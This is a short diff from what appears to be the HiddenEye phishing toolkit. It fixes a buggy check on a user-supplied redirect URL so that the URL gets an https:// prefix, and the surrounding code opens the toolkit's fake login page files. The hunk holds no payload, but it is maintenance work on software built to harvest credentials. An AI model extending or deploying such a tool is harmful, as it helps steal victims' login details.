@@ -308,10 +308,10 @@ if __name__ == "__main__":
         def custom(): #Question where user can input custom web-link
             print("\n {0}Insert a custom redirect url:".format(CYAN, DEFAULT))
             custom = input("\n{0}[HIDDENEYE-DARKSEC]- > {1}".format(CYAN, DEFAULT))
-            if 'http://' or 'https://' in custom:
+            if 'https://' in custom:
                 pass
             else:
-                custom = 'http://' + custom
+                custom = 'https://' + custom
             if path.exists('Server/www/post.php') and path.exists('Server/www/login.php'):
                 with open('Server/www/login.php') as f:
                     read_data = f.read()
